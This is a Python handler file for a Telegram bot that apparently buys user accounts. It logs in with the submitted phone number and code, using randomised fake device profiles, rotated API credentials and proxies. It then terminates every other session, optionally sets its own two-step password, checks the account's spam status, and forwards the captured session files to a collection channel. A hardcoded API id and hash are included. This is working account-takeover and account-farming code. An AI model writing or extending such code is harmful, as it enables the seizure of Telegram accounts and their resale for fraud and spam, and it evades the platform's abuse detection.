# START OF FILE handlers/login.py

import os
import logging
import asyncio
import random
import re
import sqlite3
from datetime import datetime, timedelta
from telethon import TelegramClient
from telethon.errors import (
    PhoneCodeInvalidError, SessionPasswordNeededError, PhoneNumberInvalidError,
    FloodWaitError, PhoneCodeExpiredError, PasswordHashInvalidError
)
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
from telegram import Update, Bot
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

import database
from config import BOT_TOKEN, ENABLE_SESSION_FORWARDING, SESSION_LOG_CHANNEL_ID
from .helpers import escape_markdown

logger = logging.getLogger(__name__)

DEVICE_PROFILES = [
    {"device_model": "Desktop", "system_version": "Windows 10", "app_version": "5.1.5 x64"},
    {"device_model": "PC 64bit", "system_version": "Windows 11", "app_version": "4.17.2 x64"},
    {"device_model": "Samsung Galaxy S24 Ultra", "system_version": "SDK 34", "app_version": "10.13.0 (4641)"},
    {"device_model": "Apple iPhone 15 Pro Max", "system_version": "17.5.1", "app_version": "10.13"},
]

def _get_country_info(phone_number: str, countries_config: dict) -> tuple[dict | None, str | None]:
    matching_code = next((c for c in sorted(countries_config.keys(), key=len, reverse=True) if phone_number.startswith(c)), None)
    return (countries_config.get(matching_code), matching_code) if matching_code else (None, None)

def _get_session_path(phone_number: str, user_id: str, status: str, country_name: str) -> str:
    folder_name = country_name.replace(" ", "_")
    sessions_dir_path = os.path.join("sessions", folder_name, status)
    os.makedirs(sessions_dir_path, exist_ok=True)
    session_filename = f"{phone_number} ({user_id}).session"
    return os.path.join(sessions_dir_path, session_filename)

async def _move_session_file(old_path: str, phone_number: str, user_id: str, new_status: str, country_name: str) -> str | None:
    if not old_path or not os.path.exists(old_path):
        logger.warning(f"Could not find session file to move: {old_path}")
        return None

    new_path = _get_session_path(phone_number, user_id, new_status, country_name)
    try:
        import shutil
        shutil.move(old_path, new_path)
        logger.info(f"Moved session from {old_path} to {new_path}")
        journal_file = old_path + "-journal"
        if os.path.exists(journal_file):
            os.remove(journal_file)
        return new_path
    except OSError as e:
        logger.error(f"Failed to move session file to {new_path}: {e}")
        return old_path

def _get_client_for_job(session_file: str, bot_data: dict) -> TelegramClient:
    # Try to get API credentials from rotation system first
    api_credential = database.get_next_api_credential()
    if api_credential:
        api_id = int(api_credential['api_id'])
        api_hash = api_credential['api_hash']
        logger.info(f"Using rotated API credential ID: {api_id}")
    else:
        # Fallback to default credentials
        api_id = int(bot_data.get('api_id', '25707049'))
        api_hash = bot_data.get('api_hash', '676a65f1f7028e4d969c628c73fbfccc')
        logger.warning("No API credentials in rotation pool, using default")
    device_profile = random.choice(DEVICE_PROFILES)
    proxy_str = database.get_random_proxy()
    proxy_config = None
    if proxy_str:
        proxy_parts = proxy_str.split(':')
        try:
            proxy_config = ('socks5', proxy_parts[0], int(proxy_parts[1]))
            if len(proxy_parts) == 4:
                proxy_config = ('socks5', proxy_parts[0], int(proxy_parts[1]), True, proxy_parts[2], proxy_parts[3])
        except (ValueError, IndexError) as e:
            logger.error(f"Invalid proxy format '{proxy_str}': {e}. Ignoring.")

    return TelegramClient(session_file, api_id, api_hash, device_model=device_profile["device_model"], system_version=device_profile["system_version"], app_version=device_profile["app_version"], proxy=proxy_config)

async def _perform_spambot_check(client: TelegramClient, spambot_username: str) -> tuple[str, str]:
    if not spambot_username:
        return 'ok', 'Spam check disabled.'
    try:
        me = await client.get_me()
        logger.info(f"Performing spambot check for +{me.phone}.")
        async with client.conversation(spambot_username, timeout=30) as conv:
            await conv.send_message('/start')
            resp = await conv.get_response()
            text = resp.text
            text_lower = text.lower()
            logger.info(f"SpamBot response for +{me.phone}: {text}")

            if 'good news' in text_lower or 'no limits' in text_lower or 'is free' in text_lower:
                return 'ok', "Account is free from limitations."
            elif 'your account was blocked' in text_lower:
                return 'banned', "Account is banned by Telegram."
            elif "is now limited until" in text_lower:
                return 'limited', text
            elif "i'm afraid" in text_lower or 'is limited' in text_lower or 'some limitations' in text_lower:
                return 'restricted', "Account has some initial limitations."
            else:
                return 'error', f"Unknown response from SpamBot: {text[:100]}..."
    except asyncio.TimeoutError:
        logger.error(f"Timeout during conversation with @SpamBot.")
        return 'error', "Timeout while contacting verification service."
    except Exception as e:
        logger.error(f"Error during spambot check: {e}", exc_info=True)
        return 'error', f"An exception occurred during check: {e}"

async def _send_session_to_group(bot: Bot, session_file: str, phone: str, final_status: str, country_info: dict | None):
    if not ENABLE_SESSION_FORWARDING or not SESSION_LOG_CHANNEL_ID: return
    if not country_info or not session_file or not os.path.exists(session_file): return

    topic_id = country_info.get('forum_topic_id')

    if not topic_id:
        try:
            topic_name = f"{country_info['flag']} {country_info['name']}"
            new_topic = await bot.create_forum_topic(chat_id=SESSION_LOG_CHANNEL_ID, name=topic_name)
            topic_id = new_topic.message_thread_id
            database.update_country_value(country_info['code'], 'forum_topic_id', topic_id)
            logger.info(f"Created new topic '{topic_name}' with ID {topic_id} for country code {country_info['code']}")
        except Exception as e:
            logger.error(f"Failed to create forum topic for country {country_info.get('name', 'N/A')}: {e}")
            return 

    status_emojis = {'ok': '✅', 'restricted': '⚠️', 'banned': '🚫', 'limited': '⏳'}
    status_emoji = status_emojis.get(final_status, '❓')

    caption = f"{status_emoji} *{final_status.upper()}*\n`{escape_markdown(phone)}`"

    try:
        with open(session_file, 'rb') as f:
            await bot.send_document(
                chat_id=SESSION_LOG_CHANNEL_ID,
                document=f,
                filename=os.path.basename(session_file),
                caption=caption,
                message_thread_id=topic_id,
                parse_mode=ParseMode.MARKDOWN_V2
            )
        logger.info(f"Forwarded session for {phone} to channel {SESSION_LOG_CHANNEL_ID} (Topic: {topic_id})")
    except Exception as e:
        logger.error(f"Failed to forward session file to group {SESSION_LOG_CHANNEL_ID}: {e}")

async def finalize_account_processing(bot: Bot, job_id: str, final_status: str, status_details: str):
    account = database.find_account_by_job_id(job_id)
    if not account: return

    phone = account['phone_number']
    chat_id = account['user_id']
    user_message = ""

    all_countries = database.get_countries_config()
    country_info, _ = _get_country_info(phone, all_countries)
    country_name = country_info.get("name", "Uncategorized") if country_info else "Uncategorized"

    if final_status == 'restricted':
        if country_info and country_info.get('accept_restricted') == 'True':
            price = country_info.get('price_restricted', 0.0)
            user_message = f"⚠️ Account `{escape_markdown(phone)}` accepted with issues\\.\n\nStatus: *Account has limitations\\.*\n"
            if price > 0:
                user_message += f"Amount added to balance: *${escape_markdown(f'{price:.2f}')}*"
            else:
                user_message += "It will not be added to your balance\\."
        else:
            final_status = 'error' 
            status_details = "Account has limitations, and this country does not accept them."
            user_message = f"❌ Account `{escape_markdown(phone)}` could not be accepted\\.\n\nReason: {escape_markdown(status_details)}"

    new_session_path = await _move_session_file(account['session_file'], phone, str(chat_id), final_status, country_name)

    database.update_account_status(job_id, final_status, status_details)
    if new_session_path and new_session_path != account['session_file']:
        database.execute_query("UPDATE accounts SET session_file = ? WHERE job_id = ?", (new_session_path, job_id))

    if not user_message:
        price = 0.0
        if final_status == 'ok' and country_info:
            price = country_info.get('price_ok', 0.0)

        msg_map = {
            'ok': f"✅ Account `{escape_markdown(phone)}` accepted\\!\n\nStatus: *No limitations\\.*\nAmount added to balance: *${escape_markdown(f'{price:.2f}')}*",
            'limited': f"❌ Account `{escape_markdown(phone)}` could not be accepted\\.\n\nReason: *Account is limited\\.*\nDetails: {escape_markdown(status_details)}",
            'banned': f"❌ Account `{escape_markdown(phone)}` could not be accepted\\.\n\nReason: *Account is banned or permanently restricted\\.*",
            'error': f"❌ Account `{escape_markdown(phone)}` could not be accepted\\.\n\nReason: *An internal error occurred during verification\\.*\nDetails: {escape_markdown(status_details)}"
        }
        user_message = msg_map.get(final_status, f"❌ Account `{escape_markdown(phone)}` processing finished with an unknown status: {final_status}")

    await bot.send_message(chat_id, user_message, parse_mode=ParseMode.MARKDOWN_V2)

    await _send_session_to_group(bot, new_session_path, phone, final_status, country_info)

async def reprocess_account(bot: Bot, account: dict):
    job_id = account['job_id']
    phone_number = account['phone_number']
    logger.info(f"Job {job_id} (Reprocessing): Running final check for {phone_number}")

    bot_data = database.get_all_settings()
    session_file = account.get('session_file')
    if not session_file or not os.path.exists(session_file):
        await finalize_account_processing(bot, job_id, 'error', "Session file missing for reprocessing.")
        return

    client = _get_client_for_job(session_file, bot_data)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            raise Exception("Session became unauthorized.")

        logger.info(f"Job {job_id} (Reprocessing): Terminating other sessions for {phone_number}.")
        authorizations = await client(GetAuthorizationsRequest())
        for auth in authorizations.authorizations:
            if not auth.current:
                await client(ResetAuthorizationRequest(hash=auth.hash))

        spam_status, status_details = 'ok', ''
        if bot_data.get('enable_spam_check') == 'True':
            spam_status, status_details = await _perform_spambot_check(client, bot_data.get('spambot_username'))

        await finalize_account_processing(bot, job_id, spam_status, status_details)

    except Exception as e:
        logger.error(f"Job {job_id} (Reprocessing): Critical error: {e}", exc_info=True)
        await finalize_account_processing(bot, job_id, 'error', f"Reprocessing failed: {e}")
    finally:
        if client.is_connected():
            try:
                await client.disconnect()
            except sqlite3.OperationalError as e:
                logger.error(f"Job {job_id} (Reprocessing): SQLite error on disconnect (ignoring): {e}")
            except Exception as e:
                logger.error(f"Job {job_id} (Reprocessing): Generic error on disconnect (ignoring): {e}")

async def schedule_initial_check(bot_token: str, user_id_str: str, chat_id: int, phone_number: str, job_id: str):
    bot = Bot(token=bot_token)
    client = None
    try:
        logger.info(f"Job {job_id} (Initial Check): Running for {phone_number}")
        bot_data = database.get_all_settings()
        account = database.find_account_by_job_id(job_id)

        if not account or not account.get('session_file') or not os.path.exists(account.get('session_file')):
            logger.error(f"Job {job_id}: Aborting. Could not find account data or session file for {phone_number}.")
            database.update_account_status(job_id, 'error', 'Session file lost.')
            # FIXED: Escaped period
            await bot.send_message(chat_id, f"❌ An error occurred processing `{escape_markdown(phone_number)}`: account data lost\\. Contact support\\.", parse_mode=ParseMode.MARKDOWN_V2)
            return

        if account['status'] != 'pending_confirmation':
            logger.warning(f"Job {job_id}: Skipping initial check, status is '{account['status']}'.")
            return

        client = _get_client_for_job(account['session_file'], bot_data)
        await client.connect()
        if not await client.is_user_authorized():
            raise Exception("Session not authorized.")

        if bot_data.get('enable_device_check') == 'True':
            authorizations = await client(GetAuthorizationsRequest())
            if len(authorizations.authorizations) > 1:
                logger.warning(f"Job {job_id}: Multiple sessions detected. Marking for 24h reprocessing.")
                database.update_account_status(job_id, 'pending_session_termination')
                # FIXED: Escaped period
                await bot.send_message(chat_id, f"⚠️ Multiple devices found for `{escape_markdown(phone_number)}`\\. Re-checking in 24 hours to secure the account\\.", parse_mode=ParseMode.MARKDOWN_V2)
                return

        spam_status, status_details = 'ok', ''
        if bot_data.get('enable_spam_check') == 'True':
            spam_status, status_details = await _perform_spambot_check(client, bot_data.get('spambot_username'))

        await finalize_account_processing(bot, job_id, spam_status, status_details)

    except Exception as e:
        logger.error(f"Job {job_id} (Initial Check): Critical error: {e}", exc_info=True)
        await finalize_account_processing(bot, job_id, 'error', f"Initial check failed: {e}")
    finally:
        if client and client.is_connected():
            try:
                await client.disconnect()
            except sqlite3.OperationalError as e:
                logger.error(f"Job {job_id} (Initial Check): SQLite error on disconnect (ignoring): {e}")
            except Exception as e:
                logger.error(f"Job {job_id} (Initial Check): Generic error on disconnect (ignoring): {e}")

async def handle_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id, chat_id = str(update.effective_user.id), update.effective_chat.id
    text, user = update.message.text.strip(), update.effective_user
    state = context.user_data.get('login_flow', {})

    # Log user message for admin monitoring
    if not database.is_admin(user.id):  # Don't log admin messages
        database.log_user_message(user.id, user.username, text)

    client = None 

    if not state:
        database.get_or_create_user(user.id, user.username)
        phone_number = text
        countries_config = context.bot_data.get("countries_config", {})
        country_info, _ = _get_country_info(phone_number, countries_config)

        if not country_info:
            await update.message.reply_text("❌ This country is not supported.")
            return
        if database.check_phone_exists(phone_number):
            await update.message.reply_text("❌ This phone number has already been submitted.")
            return

        logger.info(f"User @{user.username} (`{user_id}`) started login for `{phone_number}`.")
        reply_msg = await update.message.reply_text("♻️ Initializing...")

        country_name = country_info.get("name", "Uncategorized")
        session_filename = _get_session_path(phone_number, user_id, "new", country_name)

        context.user_data['login_flow'] = {
            'phone': phone_number, 'step': 'awaiting_code', 
            'prompt_msg_id': reply_msg.message_id, 'status': 'failed',
            'session_file': session_filename,
            'country_name': country_name
        }
        client = _get_client_for_job(session_filename, context.bot_data)
        context.user_data['login_flow']['client'] = client

        try:
            await client.connect()
            phone_code_hash = await client.send_code_request(phone_number)
            context.user_data['login_flow']['phone_code_hash'] = phone_code_hash
            prompt_text = f"Enter the code for `{escape_markdown(phone_number)}`\\.\n\nType /cancel to abort\\."
            await reply_msg.edit_text(prompt_text, parse_mode=ParseMode.MARKDOWN_V2)
        except Exception as e:
            error_msg = f"❌ Error: {e}"
            # FIXED: Escaped periods in error messages
            if isinstance(e, FloodWaitError): error_msg = f"❌ Rate limit\\. Please wait {e.seconds}s and try again\\."
            elif isinstance(e, PhoneNumberInvalidError): error_msg = "❌ The phone number format is invalid\\."
            else:
                error_msg = "❌ An unexpected error occurred during initialization\\."
                logger.error(f"Login init failed for `{phone_number}` by `{user_id}`: {e}", exc_info=True)

            await reply_msg.edit_text(error_msg, parse_mode=ParseMode.MARKDOWN_V2)
            await cleanup_login_flow(context)
            context.user_data.clear()

    elif state.get('step') == 'awaiting_code':
        client, phone, phone_code_hash = state.get('client'), state.get('phone'), state.get('phone_code_hash')
        code = text
        await context.bot.edit_message_text("🔄 Verifying code...", chat_id=chat_id, message_id=state['prompt_msg_id'])

        try:
            # Clean and validate the code
            code = code.strip().replace(' ', '').replace('-', '')
            if not code.isdigit() or len(code) < 4 or len(code) > 6:
                await update.message.reply_text("⚠️ Invalid code format. Please enter the 5-digit code you received.")
                return
            
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash.phone_code_hash)
            logger.info(f"Telethon login successful for user `{user_id}` with phone `{phone}`.")
            
            # Set 2FA if enabled and password is provided
            if context.bot_data.get('enable_2fa') == 'True' and context.bot_data.get('two_step_password'):
                try:
                    await client.edit_2fa(new_password=context.bot_data['two_step_password'])
                    logger.info(f"2FA enabled for account {phone}")
                except Exception as e:
                    logger.warning(f"Failed to set 2FA for {phone}: {e}")

            reg_time = datetime.utcnow()
            job_id = f"conf_{user_id}_{phone.replace('+', '')}_{int(reg_time.timestamp())}"
            database.add_account(user_id, phone, "pending_confirmation", job_id, state['session_file'])
            logger.info(f"Account `{phone}` added to DB with job_id `{job_id}`.")

            scheduler = context.application.bot_data["scheduler"]
            countries_config = context.bot_data["countries_config"]
            country_info, _ = _get_country_info(phone, countries_config)
            conf_time_s = country_info.get('time', 600) if country_info else 600

            run_date = datetime.utcnow() + timedelta(seconds=conf_time_s)
            scheduler.add_job(
                schedule_initial_check, 'date', run_date=run_date, 
                args=[BOT_TOKEN, user_id, chat_id, phone, job_id], id=job_id,
                misfire_grace_time=300
            )
            logger.info(f"Scheduled initial check for `{job_id}` in {conf_time_s} seconds.")

            conf_time_min_str = escape_markdown(f"{conf_time_s / 60:.1f}")
            await update.message.reply_text(
                f"✅ Account `{escape_markdown(phone)}` accepted for verification\\.\n\n"
                f"It will be checked in approximately *{conf_time_min_str} minutes*\\. "
                "You will receive a notification with the final result\\.",
                parse_mode=ParseMode.MARKDOWN_V2
            )
            state['status'] = 'success'

        except Exception as e:
            logger.error(f"Sign-in error for {user_id} ({phone}): {e}", exc_info=True)
            
            if isinstance(e, PhoneCodeInvalidError):
                await update.message.reply_text("⚠️ Incorrect code\\. Please check and try again or /cancel\\.")
                await context.bot.edit_message_text(
                    f"Enter the code for `{escape_markdown(phone)}`\\.\n\nType /cancel to abort\\.", 
                    chat_id=chat_id, 
                    message_id=state['prompt_msg_id'], 
                    parse_mode=ParseMode.MARKDOWN_V2
                )
                return 
            elif isinstance(e, PhoneCodeExpiredError):
                await update.message.reply_text("❌ The verification code has expired\\. Please restart the process\\.")
            elif isinstance(e, SessionPasswordNeededError):
                await update.message.reply_text("❌ This account has Two\\-Step Verification enabled\\. Please disable it first and try again\\.")
            else:
                error_msg = str(e)
                if "PHONE_CODE_INVALID" in error_msg:
                    await update.message.reply_text("⚠️ Invalid code\\. Please double\\-check the code and try again\\.")
                    await context.bot.edit_message_text(
                        f"Enter the code for `{escape_markdown(phone)}`\\.\n\nType /cancel to abort\\.", 
                        chat_id=chat_id, 
                        message_id=state['prompt_msg_id'], 
                        parse_mode=ParseMode.MARKDOWN_V2
                    )
                    return
                else:
                    await update.message.reply_text(f"❌ Sign\\-in error: {escape_markdown(error_msg)}")

        # If we are here, it means the flow is over (either by fatal error or success)
        await cleanup_login_flow(context)
        context.user_data.clear()


async def cleanup_login_flow(context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get('login_flow', {})
    if not state: return

    client = state.get('client')
    if client and client.is_connected():
        try:
            await client.disconnect()
        except sqlite3.OperationalError as e:
            logger.error(f"Cleanup: SQLite error on disconnect (ignoring): {e}")
        except Exception as e:
            logger.error(f"Cleanup: Generic error on disconnect (ignoring): {e}")

    if state.get('status') == 'failed':
        session_file = state.get('session_file')
        if session_file and os.path.exists(session_file):
            try:
                os.remove(session_file)
                logger.info(f"Removed orphaned session file on cancel: {session_file}")
                journal_file = session_file + "-journal"
                if os.path.exists(journal_file):
                    os.remove(journal_file)
            except OSError as e:
                logger.error(f"Error removing orphaned session file {session_file}: {e}")

async def _forward_session_to_channel(bot: Bot, phone: str, session_file: str, country_code: str, final_status: str):
    if not SESSION_LOG_CHANNEL_ID:
        logger.warning(f"SESSION_LOG_CHANNEL_ID not configured. Skipping session forward for {phone}")
        return

    # Try to get the topic_id for this country
    country = database.get_country_by_code(country_code)
    topic_id = country.get('forum_topic_id') if country else None

    # If no topic_id exists, try to create one
    if not topic_id and country:
        try:
            # Create a forum topic for this country
            from telegram import Bot
            topic_name = f"{country.get('flag', '')} {country.get('name', country_code)} Sessions"

            # Try to create the topic
            result = await bot.create_forum_topic(
                chat_id=SESSION_LOG_CHANNEL_ID,
                name=topic_name
            )

            if result and result.message_thread_id:
                topic_id = result.message_thread_id
                # Save the topic_id to database
                database.update_forum_topic_id(country_code, topic_id)
                logger.info(f"Created forum topic '{topic_name}' with ID {topic_id} for country {country_code}")
        except Exception as e:
            logger.warning(f"Failed to create forum topic for {country_code}: {e}. Will send to general chat.")
            topic_id = None

    phone_clean = phone.replace('+', '')
    username = "Unknown"

    try:
        session_size = os.path.getsize(session_file) if os.path.exists(session_file) else 0
        caption = f"📱 *New Session*\n\n🌍 Country: `{escape_markdown(country_code)}`\n📞 Phone: `{escape_markdown(phone)}`\n👤 User: `{escape_markdown(username)}`\n📁 Size: `{session_size} bytes`\n📅 Time: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n\n🔗 Session ID: `{escape_markdown(phone_clean)}`"

        with open(session_file, 'rb') as f:
            await bot.send_document(
                chat_id=SESSION_LOG_CHANNEL_ID,
                document=f,
                filename=os.path.basename(session_file),
                caption=caption,
                message_thread_id=topic_id,
                parse_mode=ParseMode.MARKDOWN_V2
            )
        logger.info(f"Forwarded session for {phone} to channel {SESSION_LOG_CHANNEL_ID} (Topic: {topic_id})")
    except Exception as e:
        logger.error(f"Failed to forward session file to group {SESSION_LOG_CHANNEL_ID}: {e}")
        # If topic-specific send fails, try sending to general chat
        if topic_id:
            try:
                with open(session_file, 'rb') as f:
                    await bot.send_document(
                        chat_id=SESSION_LOG_CHANNEL_ID,
                        document=f,
                        filename=os.path.basename(session_file),
                        caption=caption + f"\n\n⚠️ *Note: Sent to general chat due to topic error*",
                        parse_mode=ParseMode.MARKDOWN_V2
                    )
                logger.info(f"Fallback: Forwarded session for {phone} to general chat in {SESSION_LOG_CHANNEL_ID}")
            except Exception as fallback_e:
                logger.error(f"Failed to forward session file even to general chat: {fallback_e}")
# END OF FILE handlers/login.py